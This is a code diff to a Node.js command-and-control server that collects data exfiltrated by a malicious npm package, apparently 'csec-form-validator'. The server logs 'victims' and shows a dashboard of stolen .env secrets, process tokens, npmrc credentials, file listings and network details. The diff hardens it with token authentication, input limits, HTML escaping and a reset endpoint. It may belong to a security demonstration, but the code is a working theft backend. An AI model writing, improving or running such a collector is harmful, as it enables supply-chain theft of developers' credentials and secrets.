@@ -3,6 +3,7 @@ const fs = require('fs');
 const path = require('path');
 
 const PORT = process.env.PORT || process.env.C2_PORT || 4444;
+const C2_SECRET = process.env.C2_SECRET || '';
 const LOG = path.join(__dirname, 'stolen-data.log');
 
 const R = '\x1b[31m', G = '\x1b[32m', Y = '\x1b[33m', C = '\x1b[36m', B = '\x1b[1m', D = '\x1b[2m', X = '\x1b[0m';
@@ -12,13 +13,20 @@ let victims = [];
 console.log(`\n${R}${B}  ╔═══════════════════════════════════════════════╗`);
 console.log(`  ║       C2 SERVER — LISTENING ON PORT ${PORT}        ║`);
 console.log(`  ╚═══════════════════════════════════════════════╝${X}\n`);
+if (C2_SECRET) console.log(`${G}  [+] Token auth ENABLED${X} (set C2_SECRET)`);
+else console.log(`${Y}  [!] Token auth DISABLED${X} — anyone can POST. Set C2_SECRET env var to secure.`);
 console.log(`${D}  Dashboard: http://localhost:${PORT}${X}`);
+console.log(`${D}  Reset:     POST /reset (clears all victims)${X}`);
 console.log(`${D}  Waiting for victims...${X}\n`);
 
 http.createServer((req, res) => {
   if (req.method === 'POST' && (req.url === '/e' || req.url === '/exfil')) {
+    if (C2_SECRET && req.headers['x-token'] !== C2_SECRET) {
+      res.writeHead(403).end('forbidden');
+      return;
+    }
     let body = '';
-    req.on('data', c => body += c);
+    req.on('data', c => { if (body.length < 1e6) body += c; });
     req.on('end', () => {
       let d;
       try { d = JSON.parse(body); } catch { d = { raw: body }; }
@@ -54,6 +62,14 @@ http.createServer((req, res) => {
       console.log('');
       res.writeHead(200).end('ok');
     });
+    return;
+  }
+
+  if (req.method === 'POST' && req.url === '/reset') {
+    const count = victims.length;
+    victims = [];
+    console.log(`${Y}${B}  [*] RESET${X} — cleared ${count} victims`);
+    res.writeHead(200, { 'Content-Type': 'application/json' }).end(JSON.stringify({ cleared: count }));
     return;
   }
 
@@ -117,9 +133,10 @@ body{font-family:'JetBrains Mono','Fira Code',monospace;background:#080808;color
 <div class="st"><div class="v" id="nE">0</div><div class="l">.env Files</div></div>
 <div class="st"><div class="v" id="nF">0</div><div class="l">Sensitive Files</div></div>
 </div>
-<div id="feed"><div class="empty"><div class="icon">&#x1f4e1;</div>Waiting for victims...<br><small style="color:#333">They just need to run: npm install csec-form-helpers</small></div></div>
+<div id="feed"><div class="empty"><div class="icon">&#x1f4e1;</div>Waiting for victims...<br><small style="color:#333">They just need to run: npm install csec-form-validator</small></div></div>
 </div>
 <script>
+function esc(s){if(!s)return'-';var d=document.createElement('div');d.textContent=String(s);return d.innerHTML;}
 let seen=0;
 setInterval(async()=>{
   const r=await fetch('/api/victims');
@@ -142,24 +159,24 @@ function render(v){
 
   let envH='';
   (v.env_files||[]).forEach(ef=>{
-    envH+='<div class="src">Source: '+ef.file+'</div>';
-    Object.entries(ef.vars).forEach(([k,val])=>{envH+='<div class="tk"><span class="tn">'+k+'</span><span class="tv">'+val+'</span></div>';});
+    envH+='<div class="src">Source: '+esc(ef.file)+'</div>';
+    Object.entries(ef.vars).forEach(([k,val])=>{envH+='<div class="tk"><span class="tn">'+esc(k)+'</span><span class="tv">'+esc(val)+'</span></div>';});
   });
 
   let ptH='';
-  Object.entries(v.proc_tokens||{}).forEach(([k,val])=>{ptH+='<div class="tk"><span class="tn">'+k+'</span><span class="tv">'+val+'</span></div>';});
+  Object.entries(v.proc_tokens||{}).forEach(([k,val])=>{ptH+='<div class="tk"><span class="tn">'+esc(k)+'</span><span class="tv">'+esc(val)+'</span></div>';});
 
-  let fh='';(v.files||[]).forEach(f=>{fh+='<span class="ft">~/'+f+'</span>';});
-  let nh='';(v.network||[]).forEach(n=>{nh+='<div class="nt">'+n.iface+': '+n.ip+' ('+n.mac+')</div>';});
-  let nrh=v.npmrc?'<div class="sec"><h3>NPMRC Auth</h3><div class="nr">'+v.npmrc.replace(/\\n/g,'<br>')+'</div></div>':'';
+  let fh='';(v.files||[]).forEach(f=>{fh+='<span class="ft">~/'+esc(f)+'</span>';});
+  let nh='';(v.network||[]).forEach(n=>{nh+='<div class="nt">'+esc(n.iface)+': '+esc(n.ip)+' ('+esc(n.mac)+')</div>';});
+  let nrh=v.npmrc?'<div class="sec"><h3>NPMRC Auth</h3><div class="nr">'+esc(v.npmrc)+'</div></div>':'';
 
   const c=document.createElement('div');c.className='card';
-  c.innerHTML='<div class="ch"><h2>&#x1f6a8; Victim #'+v.id+' &mdash; '+(v.system.h||'?')+'</h2><span class="tm">'+v.time+'</span></div>'+
+  c.innerHTML='<div class="ch"><h2>&#x1f6a8; Victim #'+v.id+' &mdash; '+esc(v.system.h)+'</h2><span class="tm">'+esc(v.time)+'</span></div>'+
   '<div class="sec"><h3>System</h3>'+
-  '<div class="row"><span class="k">Host</span><span class="vl">'+(v.system.h||'-')+'</span></div>'+
-  '<div class="row"><span class="k">User</span><span class="vl">'+(v.system.u||'-')+'</span></div>'+
-  '<div class="row"><span class="k">Platform</span><span class="vl">'+(v.system.p||'-')+'</span></div>'+
-  '<div class="row"><span class="k">Home</span><span class="vl">'+(v.system.home||'-')+'</span></div></div>'+
+  '<div class="row"><span class="k">Host</span><span class="vl">'+esc(v.system.h)+'</span></div>'+
+  '<div class="row"><span class="k">User</span><span class="vl">'+esc(v.system.u)+'</span></div>'+
+  '<div class="row"><span class="k">Platform</span><span class="vl">'+esc(v.system.p)+'</span></div>'+
+  '<div class="row"><span class="k">Home</span><span class="vl">'+esc(v.system.home)+'</span></div></div>'+
   (envH?'<div class="sec"><h3>&#x1f4c1; Stolen from .env Files</h3>'+envH+'</div>':'')+
   (ptH?'<div class="sec"><h3>&#x1f6a8; Stolen from process.env</h3>'+ptH+'</div>':'')+
   nrh+
